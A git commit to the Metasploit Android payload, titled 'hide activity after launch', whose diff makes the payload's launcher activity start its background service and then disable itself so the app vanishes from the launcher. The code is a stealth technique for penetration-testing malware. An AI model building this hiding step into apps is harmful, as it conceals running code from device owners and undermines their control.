8c752b46f0832c690ef0b628d3e710473ce992a7
Tim <timrlw@gmail.com>
2016-05-24 14:56:31 +0100

    hide activity after launch

--- java/androidpayload/app/src/com/metasploit/stage/MainActivity.java
+++ java/androidpayload/app/src/com/metasploit/stage/MainActivity.java
@@ -1,14 +1,27 @@
 package com.metasploit.stage;
 
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 
 public class MainActivity extends Activity {
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         startService(new Intent(this, MainService.class));
+        disableActivity();
         finish();
+    }
+
+    private void disableActivity() {
+        PackageManager packageManager = getPackageManager();
+        ComponentName componentName = new ComponentName(getApplicationContext(),
+                MainActivity.class);
+        packageManager.setComponentEnabledSetting(componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
     }
 }
